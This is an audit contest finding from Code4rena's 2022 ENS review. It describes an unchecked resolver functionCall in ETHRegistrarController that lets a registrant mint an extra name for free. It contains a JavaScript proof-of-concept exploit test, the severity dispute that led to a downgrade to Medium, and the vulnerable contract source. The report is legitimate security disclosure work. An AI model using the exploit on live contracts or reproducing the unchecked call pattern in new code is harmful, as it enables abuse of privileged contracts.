{
  "Title": "[M-13] Users can create extra ENS records at no cost",
  "Content": "\n[ETHRegistrarController.sol#L249-L268](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L249-L268)<br>\n[ETHRegistrarController.sol#L125](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L125)<br>\n[BaseRegistrarImplementation.sol#L106](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/BaseRegistrarImplementation.sol#L106)<br>\n\nUsers using the `register` function in `ETHRegistrarController.sol`, can create an additional bogus ENS entry (Keep the ERC721 and all the glory for as long as they want) for free by exploiting the `functionCall` in the `_setRecords` function.<br>\nThe only check there (in the setRecord function) is that the nodehash matches the originally registered ENS entry, this is extremely dangerous because the rest of the functionCall is not checked and the controller has very elevated privileges in ENS ecosystem (and probably beyond).\n\nThe single exploit I am showing is already very bad, but I expect there will be more if this is left in. An example of a potential hack is that some of the functions in other ENS contracts (which give the RegistrarController elevated privilege) have dynamic types as the first variables--if users can generate a hash that is a low enough number, they will be able to unlock more exploits in the ENS ecosystem because of how dynamic types are abi encoded.  Other developers will probably also trust the `ETHRegistrarController.sol`, so other unknown dangers may come down the road.\n\nThe exploit I made (full code in PoC) can mint another ENS entry and keep it for as long as it wants, without paying more--will show code below.\n\n### Proof of Concept\n\nPut this code in the `TestEthRegistrarController.js` test suite to run. I just appended this to tests at the bottom of file.\n\nI called the `BaseRegistrarImplementation.register` function with the privileges of `ETHRegistrarController` by passing the base registrar's address as the `resolver` param in the `ETHRegistrarController.register` function call. I was able to set a custom duration at no additional cost.\n\nThe final checks of the PoC show that we own two new ENS entries from a single `ETHRegistrarController.register` call. The labelhash of the new bogus ENS entry is the nodehash of the first registered ENS entry.\n\n```js\n  it('Should allow us to make bogus erc721 token in ENS contract', async () => {\n    const label = 'newconfigname'\n    const name = `${label}.eth`\n    const node = namehash.hash(name)\n    const secondTokenDuration = 788400000 // keep bogus NFT for 25 years;\n\n    var commitment = await controller.makeCommitment(\n      label,\n      registrantAccount,\n      REGISTRATION_TIME,\n      secret,\n      baseRegistrar.address,\n      [\n        baseRegistrar.interface.encodeFunctionData('register(uint256,address,uint)', [\n          node,\n          registrantAccount,\n          secondTokenDuration\n        ]),\n      ],\n      false,\n      0,\n      0\n    )\n    var tx = await controller.commit(commitment)\n    expect(await controller.commitments(commitment)).to.equal(\n      (await web3.eth.getBlock(tx.blockNumber)).timestamp\n    )\n\n    await evm.advanceTime((await controller.minCommitmentAge()).toNumber())\n    var balanceBefore = await web3.eth.getBalance(controller.address)\n\n    let tx2 = await controller.register(\n      label,\n      registrantAccount,\n      REGISTRATION_TIME,\n      secret,\n      baseRegistrar.address,\n      [\n        baseRegistrar.interface.encodeFunctionData('register(uint256,address,uint)', [\n          node,\n          registrantAccount,\n          secondTokenDuration\n        ]),\n      ],\n      false,\n      0,\n      0,\n      { value: BUFFERED_REGISTRATION_COST }\n    )\n\n    expect(await nameWrapper.ownerOf(node)).to.equal(registrantAccount)\n    expect(await ens.owner(namehash.hash(name))).to.equal(nameWrapper.address)\n\n\n    expect(await baseRegistrar.ownerOf(node)).to.equal( // this checks that bogus NFT is owned by us\n      registrantAccount\n    )\n    expect(await baseRegistrar.ownerOf(sha3(label))).to.equal(\n      nameWrapper.address\n    )\n  })\n```\n\n### Tools Used\n\nchai tests in repo\n\n### Recommended Mitigation Steps\n\nI recommend being stricter on the signatures of the user-provided `resolver` and the function that is being called (like safeTransfer calls in existing token contracts).<br>\nAn example of how to do this is by creating an interface that ENS can publish for users that want to compose their own resolvers and call that instead of a loose functionCall. Users will be free to handle data however they like, while restricting the space of things that can go wrong.\n\nI will provide a loose example here:\n\n    interface IUserResolver {\n        function registerRecords(bytes32 nodeId, bytes32 labelHash, bytes calldata extraData)\n\n    }\n\n**[Arachnid (ENS) confirmed](https://github.com/code-423n4/2022-07-ens-findings/issues/132)**\n\n**[jefflau (ENS) disagreed with severity and commented](https://github.com/code-423n4/2022-07-ens-findings/issues/132#issuecomment-1206584808):**\n > We left this as high severity, but this is a duplicate of this: [#222 comment](https://github.com/code-423n4/2022-07-ens-findings/issues/222#issuecomment-1196396435).\n> \n> I believe this still a low severity, or at a minimum medium.\n> \n> The only thing you can pass to `register` is the node, as the `require` inside `setRecords` checks the nodehash. However `register` in the baseRegistrar itself takes a `label` not the namehash of the name, so it will register a name with the hash of `namehash(namehash('eth') + node)`, which will be a very useless name as the label will then be a 32 byte keccak hash so `0x123...abc.eth`.\n> \n> In the warden's test he tests for the node of the account they originally wanted to buy, not the bogus nft:\n> \n> ```\n> expect(await baseRegistrar.ownerOf(node)).to.equal( // this checks that bogus NFT is owned by us\n>       registrantAccount\n>     )\n> ```\n> \n> To test for the bogus nft they would need to do:\n> \n> ```\n> const node2 = sha3(namehash('eth') + node)\n> expect(await baseRegistrar.ownerOf(node2)).to.equal( // this checks that bogus NFT is owned by us\n>       registrantAccount\n>     )\n> ```\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-07-ens-findings/issues/132#issuecomment-1255167910):**\n > After a lot of consideration of this issue, I'm going to downgrade it to medium. There are two main considerations in doing this:\n> \n> 1) The \"free\" name created is essentially junk.\n> 2) The additional potential exploits are unknown and kinda hand-wavy. If there are additional exploits in the future as a result of this they almost definitely rely on external factors that don't exist today.\n\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2022-07-ens-contest",
  "Code": [
    {
      "filename": "contracts/ethregistrar/ETHRegistrarController.sol",
      "content": "pragma solidity >=0.8.4;\n\nimport \"./BaseRegistrarImplementation.sol\";\nimport \"./StringUtils.sol\";\nimport \"../resolvers/Resolver.sol\";\nimport \"../registry/ReverseRegistrar.sol\";\nimport \"./IETHRegistrarController.sol\";\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/utils/introspection/IERC165.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"../wrapper/INameWrapper.sol\";\n\n/**\n * @dev A registrar controller for registering and renewing names at fixed cost.\n */\ncontract ETHRegistrarController is Ownable, IETHRegistrarController {\n    using StringUtils for *;\n    using Address for address;\n\n    uint256 public constant MIN_REGISTRATION_DURATION = 28 days;\n    bytes32 private constant ETH_NODE =\n        0x93cdeb708b7545dc668eb9280176169d1c33cfd8ed6f04690a0bcc88a93fc4ae;\n\n    BaseRegistrarImplementation immutable base;\n    IPriceOracle public immutable prices;\n    uint256 public immutable minCommitmentAge;\n    uint256 public immutable maxCommitmentAge;\n    ReverseRegistrar public immutable reverseRegistrar;\n    INameWrapper public immutable nameWrapper;\n\n    mapping(bytes32 => uint256) public commitments;\n\n    event NameRegistered(\n        string name,\n        bytes32 indexed label,\n        address indexed owner,\n        uint256 baseCost,\n        uint256 premium,\n        uint256 expires\n    );\n    event NameRenewed(\n        string name,\n        bytes32 indexed label,\n        uint256 cost,\n        uint256 expires\n    );\n\n    constructor(\n        BaseRegistrarImplementation _base,\n        IPriceOracle _prices,\n        uint256 _minCommitmentAge,\n        uint256 _maxCommitmentAge,\n        ReverseRegistrar _reverseRegistrar,\n        INameWrapper _nameWrapper\n    ) {\n        require(_maxCommitmentAge > _minCommitmentAge);\n\n        base = _base;\n        prices = _prices;\n        minCommitmentAge = _minCommitmentAge;\n        maxCommitmentAge = _maxCommitmentAge;\n        reverseRegistrar = _reverseRegistrar;\n        nameWrapper = _nameWrapper;\n    }\n\n    function rentPrice(string memory name, uint256 duration)\n        public\n        view\n        override\n        returns (IPriceOracle.Price memory price)\n    {\n        bytes32 label = keccak256(bytes(name));\n        price = prices.price(name, base.nameExpires(uint256(label)), duration);\n    }\n\n    function valid(string memory name) public pure returns (bool) {\n        return name.strlen() >= 3;\n    }\n\n    function available(string memory name) public view override returns (bool) {\n        bytes32 label = keccak256(bytes(name));\n        return valid(name) && base.available(uint256(label));\n    }\n\n    function makeCommitment(\n        string memory name,\n        address owner,\n        uint256 duration,\n        bytes32 secret,\n        address resolver,\n        bytes[] calldata data,\n        bool reverseRecord,\n        uint32 fuses,\n        uint64 wrapperExpiry\n    ) public pure override returns (bytes32) {\n        bytes32 label = keccak256(bytes(name));\n        if (data.length > 0) {\n            require(\n                resolver != address(0),\n                \"ETHRegistrarController: resolver is required when data is supplied\"\n            );\n        }\n        return\n            keccak256(\n                abi.encode(\n                    label,\n                    owner,\n                    duration,\n                    resolver,\n                    data,\n                    secret,\n                    reverseRecord,\n                    fuses,\n                    wrapperExpiry\n                )\n            );\n    }\n\n    function commit(bytes32 commitment) public override {\n        require(commitments[commitment] + maxCommitmentAge < block.timestamp);\n        commitments[commitment] = block.timestamp;\n    }\n\n    function register(\n        string calldata name,\n        address owner,\n        uint256 duration,\n        bytes32 secret,\n        address resolver,\n        bytes[] calldata data,\n        bool reverseRecord,\n        uint32 fuses,\n        uint64 wrapperExpiry\n    ) public payable override {\n        IPriceOracle.Price memory price = rentPrice(name, duration);\n        require(\n            msg.value >= (price.base + price.premium),\n            \"ETHRegistrarController: Not enough ether provided\"\n        );\n\n        _consumeCommitment(\n            name,\n            duration,\n            makeCommitment(\n                name,\n                owner,\n                duration,\n                secret,\n                resolver,\n                data,\n                reverseRecord,\n                fuses,\n                wrapperExpiry\n            )\n        );\n\n        uint256 expires = nameWrapper.registerAndWrapETH2LD(\n            name,\n            owner,\n            duration,\n            resolver,\n            fuses,\n            wrapperExpiry\n        );\n\n        _setRecords(resolver, keccak256(bytes(name)), data);\n\n        if (reverseRecord) {\n            _setReverseRecord(name, resolver, msg.sender);\n        }\n\n        emit NameRegistered(\n            name,\n            keccak256(bytes(name)),\n            owner,\n            price.base,\n            price.premium,\n            expires\n        );\n\n        if (msg.value > (price.base + price.premium)) {\n            payable(msg.sender).transfer(\n                msg.value - (price.base + price.premium)\n            );\n        }\n    }\n\n    function renew(string calldata name, uint256 duration)\n        external\n        payable\n        override\n    {\n        bytes32 label = keccak256(bytes(name));\n        IPriceOracle.Price memory price = rentPrice(name, duration);\n        require(\n            msg.value >= price.base,\n            \"ETHController: Not enough Ether provided for renewal\"\n        );\n\n        uint256 expires = base.renew(uint256(label), duration);\n\n        if (msg.value > price.base) {\n            payable(msg.sender).transfer(msg.value - price.base);\n        }\n\n        emit NameRenewed(name, label, msg.value, expires);\n    }\n\n    function withdraw() public {\n        payable(owner()).transfer(address(this).balance);\n    }\n\n    function supportsInterface(bytes4 interfaceID)\n        external\n        pure\n        returns (bool)\n    {\n        return\n            interfaceID == type(IERC165).interfaceId ||\n            interfaceID == type(IETHRegistrarController).interfaceId;\n    }\n\n    /* Internal functions */\n\n    function _consumeCommitment(\n        string memory name,\n        uint256 duration,\n        bytes32 commitment\n    ) internal {\n        // Require a valid commitment (is old enough and is committed)\n        require(\n            commitments[commitment] + minCommitmentAge <= block.timestamp,\n            \"ETHRegistrarController: Commitment is not valid\"\n        );\n\n        // If the commitment is too old, or the name is registered, stop\n        require(\n            commitments[commitment] + maxCommitmentAge > block.timestamp,\n            \"ETHRegistrarController: Commitment has expired\"\n        );\n        require(available(name), \"ETHRegistrarController: Name is unavailable\");\n\n        delete (commitments[commitment]);\n\n        require(duration >= MIN_REGISTRATION_DURATION);\n    }\n\n    function _setRecords(\n        address resolver,\n        bytes32 label,\n        bytes[] calldata data\n    ) internal {\n        // use hardcoded .eth namehash\n        bytes32 nodehash = keccak256(abi.encodePacked(ETH_NODE, label));\n        for (uint256 i = 0; i < data.length; i++) {\n            // check first few bytes are namehash\n            bytes32 txNamehash = bytes32(data[i][4:36]);\n            require(\n                txNamehash == nodehash,\n                \"ETHRegistrarController: Namehash on record do not match the name being registered\"\n            );\n            resolver.functionCall(\n                data[i],\n                \"ETHRegistrarController: Failed to set Record\"\n            );\n        }\n    }\n\n    function _setReverseRecord(\n        string memory name,\n        address resolver,\n        address owner\n    ) internal {\n        reverseRegistrar.setNameForAddr(\n            msg.sender,\n            owner,\n            resolver,\n            string.concat(name, \".eth\")\n        );\n    }\n}"
    },
    {
      "filename": "contracts/ethregistrar/ETHRegistrarController.sol",
      "content": "pragma solidity >=0.8.4;\n\nimport \"./BaseRegistrarImplementation.sol\";\nimport \"./StringUtils.sol\";\nimport \"../resolvers/Resolver.sol\";\nimport \"../registry/ReverseRegistrar.sol\";\nimport \"./IETHRegistrarController.sol\";\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/utils/introspection/IERC165.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"../wrapper/INameWrapper.sol\";\n\n/**\n * @dev A registrar controller for registering and renewing names at fixed cost.\n */\ncontract ETHRegistrarController is Ownable, IETHRegistrarController {\n    using StringUtils for *;\n    using Address for address;\n\n    uint256 public constant MIN_REGISTRATION_DURATION = 28 days;\n    bytes32 private constant ETH_NODE =\n        0x93cdeb708b7545dc668eb9280176169d1c33cfd8ed6f04690a0bcc88a93fc4ae;\n\n    BaseRegistrarImplementation immutable base;\n    IPriceOracle public immutable prices;\n    uint256 public immutable minCommitmentAge;\n    uint256 public immutable maxCommitmentAge;\n    ReverseRegistrar public immutable reverseRegistrar;\n    INameWrapper public immutable nameWrapper;\n\n    mapping(bytes32 => uint256) public commitments;\n\n    event NameRegistered(\n        string name,\n        bytes32 indexed label,\n        address indexed owner,\n        uint256 baseCost,\n        uint256 premium,\n        uint256 expires\n    );\n    event NameRenewed(\n        string name,\n        bytes32 indexed label,\n        uint256 cost,\n        uint256 expires\n    );\n\n    constructor(\n        BaseRegistrarImplementation _base,\n        IPriceOracle _prices,\n        uint256 _minCommitmentAge,\n        uint256 _maxCommitmentAge,\n        ReverseRegistrar _reverseRegistrar,\n        INameWrapper _nameWrapper\n    ) {\n        require(_maxCommitmentAge > _minCommitmentAge);\n\n        base = _base;\n        prices = _prices;\n        minCommitmentAge = _minCommitmentAge;\n        maxCommitmentAge = _maxCommitmentAge;\n        reverseRegistrar = _reverseRegistrar;\n        nameWrapper = _nameWrapper;\n    }\n\n    function rentPrice(string memory name, uint256 duration)\n        public\n        view\n        override\n        returns (IPriceOracle.Price memory price)\n    {\n        bytes32 label = keccak256(bytes(name));\n        price = prices.price(name, base.nameExpires(uint256(label)), duration);\n    }\n\n    function valid(string memory name) public pure returns (bool) {\n        return name.strlen() >= 3;\n    }\n\n    function available(string memory name) public view override returns (bool) {\n        bytes32 label = keccak256(bytes(name));\n        return valid(name) && base.available(uint256(label));\n    }\n\n    function makeCommitment(\n        string memory name,\n        address owner,\n        uint256 duration,\n        bytes32 secret,\n        address resolver,\n        bytes[] calldata data,\n        bool reverseRecord,\n        uint32 fuses,\n        uint64 wrapperExpiry\n    ) public pure override returns (bytes32) {\n        bytes32 label = keccak256(bytes(name));\n        if (data.length > 0) {\n            require(\n                resolver != address(0),\n                \"ETHRegistrarController: resolver is required when data is supplied\"\n            );\n        }\n        return\n            keccak256(\n                abi.encode(\n                    label,\n                    owner,\n                    duration,\n                    resolver,\n                    data,\n                    secret,\n                    reverseRecord,\n                    fuses,\n                    wrapperExpiry\n                )\n            );\n    }\n\n    function commit(bytes32 commitment) public override {\n        require(commitments[commitment] + maxCommitmentAge < block.timestamp);\n        commitments[commitment] = block.timestamp;\n    }\n\n    function register(\n        string calldata name,\n        address owner,\n        uint256 duration,\n        bytes32 secret,\n        address resolver,\n        bytes[] calldata data,\n        bool reverseRecord,\n        uint32 fuses,\n        uint64 wrapperExpiry\n    ) public payable override {\n        IPriceOracle.Price memory price = rentPrice(name, duration);\n        require(\n            msg.value >= (price.base + price.premium),\n            \"ETHRegistrarController: Not enough ether provided\"\n        );\n\n        _consumeCommitment(\n            name,\n            duration,\n            makeCommitment(\n                name,\n                owner,\n                duration,\n                secret,\n                resolver,\n                data,\n                reverseRecord,\n                fuses,\n                wrapperExpiry\n            )\n        );\n\n        uint256 expires = nameWrapper.registerAndWrapETH2LD(\n            name,\n            owner,\n            duration,\n            resolver,\n            fuses,\n            wrapperExpiry\n        );\n\n        _setRecords(resolver, keccak256(bytes(name)), data);\n\n        if (reverseRecord) {\n            _setReverseRecord(name, resolver, msg.sender);\n        }\n\n        emit NameRegistered(\n            name,\n            keccak256(bytes(name)),\n            owner,\n            price.base,\n            price.premium,\n            expires\n        );\n\n        if (msg.value > (price.base + price.premium)) {\n            payable(msg.sender).transfer(\n                msg.value - (price.base + price.premium)\n            );\n        }\n    }\n\n    function renew(string calldata name, uint256 duration)\n        external\n        payable\n        override\n    {\n        bytes32 label = keccak256(bytes(name));\n        IPriceOracle.Price memory price = rentPrice(name, duration);\n        require(\n            msg.value >= price.base,\n            \"ETHController: Not enough Ether provided for renewal\"\n        );\n\n        uint256 expires = base.renew(uint256(label), duration);\n\n        if (msg.value > price.base) {\n            payable(msg.sender).transfer(msg.value - price.base);\n        }\n\n        emit NameRenewed(name, label, msg.value, expires);\n    }\n\n    function withdraw() public {\n        payable(owner()).transfer(address(this).balance);\n    }\n\n    function supportsInterface(bytes4 interfaceID)\n        external\n        pure\n        returns (bool)\n    {\n        return\n            interfaceID == type(IERC165).interfaceId ||\n            interfaceID == type(IETHRegistrarController).interfaceId;\n    }\n\n    /* Internal functions */\n\n    function _consumeCommitment(\n        string memory name,\n        uint256 duration,\n        bytes32 commitment\n    ) internal {\n        // Require a valid commitment (is old enough and is committed)\n        require(\n            commitments[commitment] + minCommitmentAge <= block.timestamp,\n            \"ETHRegistrarController: Commitment is not valid\"\n        );\n\n        // If the commitment is too old, or the name is registered, stop\n        require(\n            commitments[commitment] + maxCommitmentAge > block.timestamp,\n            \"ETHRegistrarController: Commitment has expired\"\n        );\n        require(available(name), \"ETHRegistrarController: Name is unavailable\");\n\n        delete (commitments[commitment]);\n\n        require(duration >= MIN_REGISTRATION_DURATION);\n    }\n\n    function _setRecords(\n        address resolver,\n        bytes32 label,\n        bytes[] calldata data\n    ) internal {\n        // use hardcoded .eth namehash\n        bytes32 nodehash = keccak256(abi.encodePacked(ETH_NODE, label));\n        for (uint256 i = 0; i < data.length; i++) {\n            // check first few bytes are namehash\n            bytes32 txNamehash = bytes32(data[i][4:36]);\n            require(\n                txNamehash == nodehash,\n                \"ETHRegistrarController: Namehash on record do not match the name being registered\"\n            );\n            resolver.functionCall(\n                data[i],\n                \"ETHRegistrarController: Failed to set Record\"\n            );\n        }\n    }\n\n    function _setReverseRecord(\n        string memory name,\n        address resolver,\n        address owner\n    ) internal {\n        reverseRegistrar.setNameForAddr(\n            msg.sender,\n            owner,\n            resolver,\n            string.concat(name, \".eth\")\n        );\n    }\n}"
    },
    {
      "filename": "contracts/ethregistrar/BaseRegistrarImplementation.sol",
      "content": "pragma solidity >=0.8.4;\n\nimport \"../registry/ENS.sol\";\nimport \"./IBaseRegistrar.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract BaseRegistrarImplementation is ERC721, IBaseRegistrar, Ownable  {\n    // A map of expiry times\n    mapping(uint256=>uint) expiries;\n    // The ENS registry\n    ENS public ens;\n    // The namehash of the TLD this registrar owns (eg, .eth)\n    bytes32 public baseNode;\n    // A map of addresses that are authorised to register and renew names.\n    mapping(address => bool) public controllers;\n    uint256 public constant GRACE_PERIOD = 90 days;\n    bytes4 constant private INTERFACE_META_ID = bytes4(keccak256(\"supportsInterface(bytes4)\"));\n    bytes4 constant private ERC721_ID = bytes4(\n        keccak256(\"balanceOf(address)\") ^\n        keccak256(\"ownerOf(uint256)\") ^\n        keccak256(\"approve(address,uint256)\") ^\n        keccak256(\"getApproved(uint256)\") ^\n        keccak256(\"setApprovalForAll(address,bool)\") ^\n        keccak256(\"isApprovedForAll(address,address)\") ^\n        keccak256(\"transferFrom(address,address,uint256)\") ^\n        keccak256(\"safeTransferFrom(address,address,uint256)\") ^\n        keccak256(\"safeTransferFrom(address,address,uint256,bytes)\")\n    );\n    bytes4 constant private RECLAIM_ID = bytes4(keccak256(\"reclaim(uint256,address)\"));\n\n    /**\n     * v2.1.3 version of _isApprovedOrOwner which calls ownerOf(tokenId) and takes grace period into consideration instead of ERC721.ownerOf(tokenId);\n     * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.1.3/contracts/token/ERC721/ERC721.sol#L187\n     * @dev Returns whether the given spender can transfer a given token ID\n     * @param spender address of the spender to query\n     * @param tokenId uint256 ID of the token to be transferred\n     * @return bool whether the msg.sender is approved for the given token ID,\n     *    is an operator of the owner, or is the owner of the token\n     */\n    function _isApprovedOrOwner(address spender, uint256 tokenId) internal view override returns (bool) {\n        address owner = ownerOf(tokenId);\n        return (spender == owner || getApproved(tokenId) == spender || isApprovedForAll(owner, spender));\n    }\n\n    constructor(ENS _ens, bytes32 _baseNode) ERC721(\"\",\"\") {\n        ens = _ens;\n        baseNode = _baseNode;\n    }\n\n    modifier live {\n        require(ens.owner(baseNode) == address(this));\n        _;\n    }\n\n    modifier onlyController {\n        require(controllers[msg.sender]);\n        _;\n    }\n\n    /**\n     * @dev Gets the owner of the specified token ID. Names become unowned\n     *      when their registration expires.\n     * @param tokenId uint256 ID of the token to query the owner of\n     * @return address currently marked as the owner of the given token ID\n     */\n    function ownerOf(uint256 tokenId) public view override(IERC721, ERC721) returns (address) {\n        require(expiries[tokenId] > block.timestamp);\n        return super.ownerOf(tokenId);\n    }\n\n    // Authorises a controller, who can register and renew domains.\n    function addController(address controller) external override onlyOwner {\n        controllers[controller] = true;\n        emit ControllerAdded(controller);\n    }\n\n    // Revoke controller permission for an address.\n    function removeController(address controller) external override onlyOwner {\n        controllers[controller] = false;\n        emit ControllerRemoved(controller);\n    }\n\n    // Set the resolver for the TLD this registrar manages.\n    function setResolver(address resolver) external override onlyOwner {\n        ens.setResolver(baseNode, resolver);\n    }\n\n    // Returns the expiration timestamp of the specified id.\n    function nameExpires(uint256 id) external view override returns(uint) {\n        return expiries[id];\n    }\n\n    // Returns true iff the specified name is available for registration.\n    function available(uint256 id) public view override returns(bool) {\n        // Not available if it's registered here or in its grace period.\n        return expiries[id] + GRACE_PERIOD < block.timestamp;\n    }\n\n    /**\n     * @dev Register a name.\n     * @param id The token ID (keccak256 of the label).\n     * @param owner The address that should own the registration.\n     * @param duration Duration in seconds for the registration.\n     */\n    function register(uint256 id, address owner, uint duration) external override returns(uint) {\n      return _register(id, owner, duration, true);\n    }\n\n    /**\n     * @dev Register a name, without modifying the registry.\n     * @param id The token ID (keccak256 of the label).\n     * @param owner The address that should own the registration.\n     * @param duration Duration in seconds for the registration.\n     */\n    function registerOnly(uint256 id, address owner, uint duration) external returns(uint) {\n      return _register(id, owner, duration, false);\n    }\n\n    function _register(uint256 id, address owner, uint duration, bool updateRegistry) internal live onlyController returns(uint) {\n        require(available(id));\n        require(block.timestamp + duration + GRACE_PERIOD > block.timestamp + GRACE_PERIOD); // Prevent future overflow\n\n        expiries[id] = block.timestamp + duration;\n        if(_exists(id)) {\n            // Name was previously owned, and expired\n            _burn(id);\n        }\n        _mint(owner, id);\n        if(updateRegistry) {\n            ens.setSubnodeOwner(baseNode, bytes32(id), owner);\n        }\n\n        emit NameRegistered(id, owner, block.timestamp + duration);\n\n        return block.timestamp + duration;\n    }\n\n    function renew(uint256 id, uint duration) external override live onlyController returns(uint) {\n        require(expiries[id] + GRACE_PERIOD >= block.timestamp); // Name must be registered here or in grace period\n        require(expiries[id] + duration + GRACE_PERIOD > duration + GRACE_PERIOD); // Prevent future overflow\n\n        expiries[id] += duration;\n        emit NameRenewed(id, expiries[id]);\n        return expiries[id];\n    }\n\n    /**\n     * @dev Reclaim ownership of a name in ENS, if you own it in the registrar.\n     */\n    function reclaim(uint256 id, address owner) external override live {\n        require(_isApprovedOrOwner(msg.sender, id));\n        ens.setSubnodeOwner(baseNode, bytes32(id), owner);\n    }\n\n    function supportsInterface(bytes4 interfaceID) public override(ERC721, IERC165) view returns (bool) {\n        return interfaceID == INTERFACE_META_ID ||\n               interfaceID == ERC721_ID ||\n               interfaceID == RECLAIM_ID;\n    }\n}"
    }
  ]
}